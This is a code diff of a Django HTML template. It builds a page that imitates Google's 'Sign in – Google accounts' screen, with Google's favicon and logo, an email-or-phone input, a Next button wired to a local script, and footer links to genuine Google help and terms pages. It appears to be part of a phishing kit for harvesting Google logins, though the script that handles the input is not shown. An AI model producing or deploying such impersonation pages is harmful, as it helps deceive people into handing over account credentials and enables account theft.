@@ -1,7 +1,63 @@
-{% extends 'google_acc_base.html' %}
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
 
-{% block csrf %}
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" />
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="{% static 'css/reset.css' %}" />
+  <link rel="stylesheet" href="{% static 'css/styles.css' %}" />
+  <link rel="icon" type="image/x-icon" href="https://google.com/favicon.ico">
+  <title>Sign in – Google accounts</title>
+  <script src="{% static 'js/script.js' %}"></script>
+</head>
 
-    {% csrf_token %}
+<body id="html_" onload="updatetext()">
+  <div class="container">
+    <div class="card">
+      <img class="disable-select" src="{% static 'images/google-logo.svg' %}" alt="" />
+      <h2>Sign in</h2>
+      <h3 id="text_2">to continue to </h3>
+      <div class="input-contain">
+        <input type="text" id="fname" name="fname" autocomplete="off" value="" aria-labelledby="placeholder-fname">
+        <label class="placeholder-text" for="fname" id="placeholder-fname">
+          <div id="placeholder_" class="text">Email or phone</div>
+        </label>
+      </div>
+      <div style="text-align: left;!important">
+        <b id="error"></b>
+        <div class="btn-email">
+          <button type="button"><a target="_blank" class="link" href="./400.html">Forgot Email?</a></button>
+        </div>
+        <p>
+          Not your computer? Use Guest mode to sign in privately.
+          <a target="_blank" href="">Learn more</a>
+        </p>
 
-{% endblock csrf %}
+        <div class="card-bottom">
+          <a target="_blank" href="./400.html">Create account</a>
+          <button type="button" onclick="next()" class="disable-select">Next</button>
+        </div>
+      </div>
+      <div id="spacer"><br><br>
+        <div style="height: 10px;"></div>
+      </div>
+      <div class="footer">
+        <select class="disable-select" name="select">
+          <option value="English (United States)">
+            English (United States)
+          </option>
+        </select>
+        <div class="footer-span">
+          <span><a target="_blank" class="btn" href="https://support.google.com/accounts?hl=en">Help</a></span>
+          <span><a target="_blank" class="btn"
+              href="https://accounts.google.com/TOS?loc=US&hl=en&privacy=true">Privacy</a></span>
+          <span><a target="_blank" class="btn" href="https://accounts.google.com/TOS?loc=US&hl=en">Terms</a></span>
+        </div>
+      </div>
+    </div>
+</body>
+
+</html>
